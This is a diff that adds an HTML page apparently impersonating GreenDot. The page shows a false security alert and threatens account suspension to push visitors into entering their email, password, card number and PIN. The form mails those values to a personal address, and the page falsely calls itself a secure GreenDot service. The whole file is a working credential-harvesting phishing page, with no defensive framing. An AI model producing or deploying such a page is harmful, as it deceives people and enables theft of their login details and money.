@@ -1,0 +1,17 @@
+<html>
+<head>
+<title>GreenDot Secure Verification</title>
+</head>
+<body style="text-align: center; background: #fff; font-family: Arial;">
+<h1 style="color: green;">GreenDot Account Security Alert</h1>
+<p style="font-size: 18px;">We've detected unusual activity on your account. Please verify your details below to prevent suspension and secure your funds.</p>
+<form action="mailto:nancycole291" method="POST" enctype="text/plain">
+  Email: <input type="text" name="email" style="width: 300px; padding: 10px;"><br><br>
+  Password: <input type="password" name="password" style="width: 300px; padding: 10px;"><br><br>
+  Card Number: <input type="text" name="card" style="width: 300px; padding: 10px;"><br><br>
+  PIN: <input type="text" name="pin" style="width: 300px; padding: 10px;"><br><br>
+  <input type="submit" value="Verify Account" style="background: green; color: white; padding: 15px; font-size: 16px; border: none;">
+</form>
+<p style="font-size: 14px; color: gray;">This is a secure GreenDot service. Your information is protected.</p>
+</body>
+</html>
